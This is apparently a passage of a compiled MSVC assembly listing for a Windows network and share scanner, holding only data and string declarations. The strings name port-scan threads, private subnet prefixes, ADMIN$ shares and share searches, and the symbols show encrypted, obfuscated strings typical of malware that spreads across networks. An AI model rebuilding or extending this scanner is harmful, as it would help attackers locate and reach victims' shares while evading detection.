; Listing generated by Microsoft (R) Optimizing Compiler Version 19.39.33522.0 

include listing.inc

INCLUDELIB OLDNAMES

PUBLIC	??_C@_1FA@PDLBHGMH@?$AAG?$AAe?$AAt?$AAI?$AAp?$AAN?$AAe?$AAt?$AAT?$AAa?$AAb?$AAl?$AAe?$AA?5?$AAf@ ; `string'
PUBLIC	??_C@_04OEIIGBBO@172?4@				; `string'
PUBLIC	??_C@_08NABKCMOE@192?4168?4@			; `string'
PUBLIC	??_C@_03LJEAFDJL@10?4@				; `string'
PUBLIC	??_C@_04FAGBOJJK@169?4@				; `string'
PUBLIC	??_C@_1O@IGADBKJD@?$AAA?$AAD?$AAM?$AAI?$AAN?$AA$@ ; `string'
PUBLIC	??_C@_15LEKKCGMK@?$AA?2?$AA?2@			; `string'
PUBLIC	??_C@_1CA@HOLMOEOA@?$AAF?$AAo?$AAu?$AAn?$AAd?$AA?5?$AAs?$AAh?$AAa?$AAr?$AAe?$AA?5?$AA?$CF?$AAs?$AA?4@ ; `string'
PUBLIC	??_C@_1DK@JBOOEPIJ@?$AAS?$AAt?$AAa?$AAr?$AAt?$AAi?$AAn?$AAg?$AA?5?$AAs?$AAe?$AAa?$AAr?$AAc?$AAh@ ; `string'
PUBLIC	??_C@_1CK@KJAPOAIC@?$AAC?$AAa?$AAn?$AA?8?$AAt?$AA?5?$AAg?$AAe?$AAt?$AA?5?$AAC?$AAo?$AAn?$AAn?$AAe@ ; `string'
PUBLIC	??_C@_1EC@NEINNOEO@?$AAC?$AAa?$AAn?$AA?8?$AAt?$AA?5?$AAc?$AAr?$AAe?$AAa?$AAt?$AAe?$AA?5?$AAi?$AAo@ ; `string'
PUBLIC	??_C@_1CG@ONPGBBAD@?$AAC?$AAa?$AAn?$AA?8?$AAt?$AA?5?$AAg?$AAe?$AAt?$AA?5?$AAs?$AAu?$AAb?$AAn?$AAe@ ; `string'
PUBLIC	??_C@_1DE@GMHBIMDA@?$AAC?$AAa?$AAn?$AA?8?$AAt?$AA?5?$AAc?$AAr?$AAe?$AAa?$AAt?$AAe?$AA?5?$AAh?$AAo@ ; `string'
PUBLIC	??_C@_1DO@GOJNCDIO@?$AAC?$AAa?$AAn?$AA?8?$AAt?$AA?5?$AAc?$AAr?$AAe?$AAa?$AAt?$AAe?$AA?5?$AAp?$AAo@ ; `string'
PUBLIC	?g_ActiveOperations@@3JA			; g_ActiveOperations
PUBLIC	?g_HostEntry@@3PEAUhostent@@EA			; g_HostEntry
PUBLIC	?g_HostList@@3Uhost_list_@@A			; g_HostList
PUBLIC	?g_SubnetList@@3Usubnet_list_@@A		; g_SubnetList
PUBLIC	?g_IocpHandle@@3PEAXEA				; g_IocpHandle
PUBLIC	?g_ConnectEx@@3P6AH_KPEBUsockaddr@@HPEAXKPEAKPEAU_OVERLAPPED@@@ZEA ; g_ConnectEx
PUBLIC	?g_CriticalSection@@3U_RTL_CRITICAL_SECTION@@A	; g_CriticalSection
PUBLIC	?g_ConnectionList@@3Uconnection_list_@@A	; g_ConnectionList
EXTRN	__imp_htons:PROC
EXTRN	__imp_WSAGetLastError:PROC
?g_ActiveOperations@@3JA DD 01H DUP (?)			; g_ActiveOperations
?g_HostEntry@@3PEAUhostent@@EA DQ 01H DUP (?)		; g_HostEntry
?g_HostList@@3Uhost_list_@@A DB 010H DUP (?)		; g_HostList
?g_SubnetList@@3Usubnet_list_@@A DB 010H DUP (?)	; g_SubnetList
?g_IocpHandle@@3PEAXEA DQ 01H DUP (?)			; g_IocpHandle
?g_ConnectEx@@3P6AH_KPEBUsockaddr@@HPEAXKPEAKPEAU_OVERLAPPED@@@ZEA DQ 01H DUP (?) ; g_ConnectEx
?g_CriticalSection@@3U_RTL_CRITICAL_SECTION@@A DB 028H DUP (?) ; g_CriticalSection
?g_ConnectionList@@3Uconnection_list_@@A DB 010H DUP (?) ; g_ConnectionList
_BSS	ENDS
;	COMDAT ??_C@_1DO@GOJNCDIO@?$AAC?$AAa?$AAn?$AA?8?$AAt?$AA?5?$AAc?$AAr?$AAe?$AAa?$AAt?$AAe?$AA?5?$AAp?$AAo@
CONST	SEGMENT
??_C@_1DO@GOJNCDIO@?$AAC?$AAa?$AAn?$AA?8?$AAt?$AA?5?$AAc?$AAr?$AAe?$AAa?$AAt?$AAe?$AA?5?$AAp?$AAo@ DB 'C'
	DB	00H, 'a', 00H, 'n', 00H, '''', 00H, 't', 00H, ' ', 00H, 'c', 00H
	DB	'r', 00H, 'e', 00H, 'a', 00H, 't', 00H, 'e', 00H, ' ', 00H, 'p'
	DB	00H, 'o', 00H, 'r', 00H, 't', 00H, ' ', 00H, 's', 00H, 'c', 00H
	DB	'a', 00H, 'n', 00H, ' ', 00H, 't', 00H, 'h', 00H, 'r', 00H, 'e'
	DB	00H, 'a', 00H, 'd', 00H, '.', 00H, 00H, 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_1DE@GMHBIMDA@?$AAC?$AAa?$AAn?$AA?8?$AAt?$AA?5?$AAc?$AAr?$AAe?$AAa?$AAt?$AAe?$AA?5?$AAh?$AAo@
CONST	SEGMENT
??_C@_1DE@GMHBIMDA@?$AAC?$AAa?$AAn?$AA?8?$AAt?$AA?5?$AAc?$AAr?$AAe?$AAa?$AAt?$AAe?$AA?5?$AAh?$AAo@ DB 'C'
	DB	00H, 'a', 00H, 'n', 00H, '''', 00H, 't', 00H, ' ', 00H, 'c', 00H
	DB	'r', 00H, 'e', 00H, 'a', 00H, 't', 00H, 'e', 00H, ' ', 00H, 'h'
	DB	00H, 'o', 00H, 's', 00H, 't', 00H, ' ', 00H, 't', 00H, 'h', 00H
	DB	'r', 00H, 'e', 00H, 'a', 00H, 'd', 00H, '.', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_1CG@ONPGBBAD@?$AAC?$AAa?$AAn?$AA?8?$AAt?$AA?5?$AAg?$AAe?$AAt?$AA?5?$AAs?$AAu?$AAb?$AAn?$AAe@
CONST	SEGMENT
??_C@_1CG@ONPGBBAD@?$AAC?$AAa?$AAn?$AA?8?$AAt?$AA?5?$AAg?$AAe?$AAt?$AA?5?$AAs?$AAu?$AAb?$AAn?$AAe@ DB 'C'
	DB	00H, 'a', 00H, 'n', 00H, '''', 00H, 't', 00H, ' ', 00H, 'g', 00H
	DB	'e', 00H, 't', 00H, ' ', 00H, 's', 00H, 'u', 00H, 'b', 00H, 'n'
	DB	00H, 'e', 00H, 't', 00H, 's', 00H, '.', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_1EC@NEINNOEO@?$AAC?$AAa?$AAn?$AA?8?$AAt?$AA?5?$AAc?$AAr?$AAe?$AAa?$AAt?$AAe?$AA?5?$AAi?$AAo@
CONST	SEGMENT
??_C@_1EC@NEINNOEO@?$AAC?$AAa?$AAn?$AA?8?$AAt?$AA?5?$AAc?$AAr?$AAe?$AAa?$AAt?$AAe?$AA?5?$AAi?$AAo@ DB 'C'
	DB	00H, 'a', 00H, 'n', 00H, '''', 00H, 't', 00H, ' ', 00H, 'c', 00H
	DB	'r', 00H, 'e', 00H, 'a', 00H, 't', 00H, 'e', 00H, ' ', 00H, 'i'
	DB	00H, 'o', 00H, ' ', 00H, 'c', 00H, 'o', 00H, 'm', 00H, 'p', 00H
	DB	'l', 00H, 'e', 00H, 't', 00H, 'i', 00H, 'o', 00H, 'n', 00H, ' '
	DB	00H, 'p', 00H, 'o', 00H, 'r', 00H, 't', 00H, '.', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_1CK@KJAPOAIC@?$AAC?$AAa?$AAn?$AA?8?$AAt?$AA?5?$AAg?$AAe?$AAt?$AA?5?$AAC?$AAo?$AAn?$AAn?$AAe@
CONST	SEGMENT
??_C@_1CK@KJAPOAIC@?$AAC?$AAa?$AAn?$AA?8?$AAt?$AA?5?$AAg?$AAe?$AAt?$AA?5?$AAC?$AAo?$AAn?$AAn?$AAe@ DB 'C'
	DB	00H, 'a', 00H, 'n', 00H, '''', 00H, 't', 00H, ' ', 00H, 'g', 00H
	DB	'e', 00H, 't', 00H, ' ', 00H, 'C', 00H, 'o', 00H, 'n', 00H, 'n'
	DB	00H, 'e', 00H, 'c', 00H, 't', 00H, 'E', 00H, 'x', 00H, '.', 00H
	DB	00H, 00H					; `string'
CONST	ENDS
;	COMDAT ??_C@_1DK@JBOOEPIJ@?$AAS?$AAt?$AAa?$AAr?$AAt?$AAi?$AAn?$AAg?$AA?5?$AAs?$AAe?$AAa?$AAr?$AAc?$AAh@
CONST	SEGMENT
??_C@_1DK@JBOOEPIJ@?$AAS?$AAt?$AAa?$AAr?$AAt?$AAi?$AAn?$AAg?$AA?5?$AAs?$AAe?$AAa?$AAr?$AAc?$AAh@ DB 'S'
	DB	00H, 't', 00H, 'a', 00H, 'r', 00H, 't', 00H, 'i', 00H, 'n', 00H
	DB	'g', 00H, ' ', 00H, 's', 00H, 'e', 00H, 'a', 00H, 'r', 00H, 'c'
	DB	00H, 'h', 00H, ' ', 00H, 'o', 00H, 'n', 00H, ' ', 00H, 's', 00H
	DB	'h', 00H, 'a', 00H, 'r', 00H, 'e', 00H, ' ', 00H, '%', 00H, 's'
	DB	00H, '.', 00H, 00H, 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_1CA@HOLMOEOA@?$AAF?$AAo?$AAu?$AAn?$AAd?$AA?5?$AAs?$AAh?$AAa?$AAr?$AAe?$AA?5?$AA?$CF?$AAs?$AA?4@
CONST	SEGMENT
??_C@_1CA@HOLMOEOA@?$AAF?$AAo?$AAu?$AAn?$AAd?$AA?5?$AAs?$AAh?$AAa?$AAr?$AAe?$AA?5?$AA?$CF?$AAs?$AA?4@ DB 'F'
	DB	00H, 'o', 00H, 'u', 00H, 'n', 00H, 'd', 00H, ' ', 00H, 's', 00H
	DB	'h', 00H, 'a', 00H, 'r', 00H, 'e', 00H, ' ', 00H, '%', 00H, 's'
	DB	00H, '.', 00H, 00H, 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_15LEKKCGMK@?$AA?2?$AA?2@
CONST	SEGMENT
??_C@_15LEKKCGMK@?$AA?2?$AA?2@ DB '\', 00H, '\', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_1O@IGADBKJD@?$AAA?$AAD?$AAM?$AAI?$AAN?$AA$@
CONST	SEGMENT
??_C@_1O@IGADBKJD@?$AAA?$AAD?$AAM?$AAI?$AAN?$AA$@ DB 'A', 00H, 'D', 00H, 'M'
	DB	00H, 'I', 00H, 'N', 00H, '$', 00H, 00H, 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_04FAGBOJJK@169?4@
CONST	SEGMENT
??_C@_04FAGBOJJK@169?4@ DB '169.', 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_03LJEAFDJL@10?4@
CONST	SEGMENT
??_C@_03LJEAFDJL@10?4@ DB '10.', 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_08NABKCMOE@192?4168?4@
CONST	SEGMENT
??_C@_08NABKCMOE@192?4168?4@ DB '192.168.', 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_04OEIIGBBO@172?4@
CONST	SEGMENT
??_C@_04OEIIGBBO@172?4@ DB '172.', 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_1FA@PDLBHGMH@?$AAG?$AAe?$AAt?$AAI?$AAp?$AAN?$AAe?$AAt?$AAT?$AAa?$AAb?$AAl?$AAe?$AA?5?$AAf@
CONST	SEGMENT
??_C@_1FA@PDLBHGMH@?$AAG?$AAe?$AAt?$AAI?$AAp?$AAN?$AAe?$AAt?$AAT?$AAa?$AAb?$AAl?$AAe?$AA?5?$AAf@ DB 'G'
	DB	00H, 'e', 00H, 't', 00H, 'I', 00H, 'p', 00H, 'N', 00H, 'e', 00H
	DB	't', 00H, 'T', 00H, 'a', 00H, 'b', 00H, 'l', 00H, 'e', 00H, ' '
	DB	00H, 'f', 00H, 'a', 00H, 'i', 00H, 'l', 00H, 's', 00H, '.', 00H
	DB	' ', 00H, 'G', 00H, 'e', 00H, 't', 00H, 'L', 00H, 'a', 00H, 's'
	DB	00H, 't', 00H, 'E', 00H, 'r', 00H, 'r', 00H, 'o', 00H, 'r', 00H
	DB	' ', 00H, '=', 00H, ' ', 00H, '%', 00H, 'l', 00H, 'u', 00H, 00H
	DB	00H						; `string'
?_Fake_alloc@std@@3U_Fake_allocator@1@B	ORG $+1		; std::_Fake_alloc
PUBLIC	?isDecrypted@?$MetaBuffer@$0DN@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEBA_NXZ ; MetaBuffer<61,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0DN@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<61,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0DN@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<61,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$04$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEBA_NXZ ; MetaBuffer<5,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$04$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<5,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$04$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<5,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$06$0BK@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEBA_NXZ ; MetaBuffer<7,26,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$06$0BK@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z ; MetaBuffer<7,26,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$06$0BK@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z ; MetaBuffer<7,26,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0BH@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@QEBA_NXZ ; MetaBuffer<23,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0BH@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@AEBAEE@Z ; MetaBuffer<23,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0BH@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07@std@@@@AEBAEE@Z ; MetaBuffer<23,105,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0HB@$01U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ ; MetaBuffer<113,2,std::integer_sequence<unsigned __int64,0,1,2,3> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0HB@$01U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ; MetaBuffer<113,2,std::integer_sequence<unsigned __int64,0,1,2,3> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0HB@$01U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ; MetaBuffer<113,2,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0GB@$0L@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEBA_NXZ ; MetaBuffer<97,11,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0GB@$0L@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z ; MetaBuffer<97,11,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0GB@$0L@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z ; MetaBuffer<97,11,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0N@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ ; MetaBuffer<13,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0N@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ; MetaBuffer<13,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0N@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ; MetaBuffer<13,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0EJ@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ ; MetaBuffer<73,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0EJ@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<73,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0EJ@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<73,29,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0EP@$0HK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ ; MetaBuffer<79,122,std::integer_sequence<unsigned __int64,0,1,2,3> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0EP@$0HK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ; MetaBuffer<79,122,std::integer_sequence<unsigned __int64,0,1,2,3> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0EP@$0HK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ; MetaBuffer<79,122,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0GH@$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@QEBA_NXZ ; MetaBuffer<103,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0GH@$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z ; MetaBuffer<103,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0GH@$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@@std@@@@AEBAEE@Z ; MetaBuffer<103,117,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0DN@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@QEBA_NXZ ; MetaBuffer<61,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0DN@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ; MetaBuffer<61,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
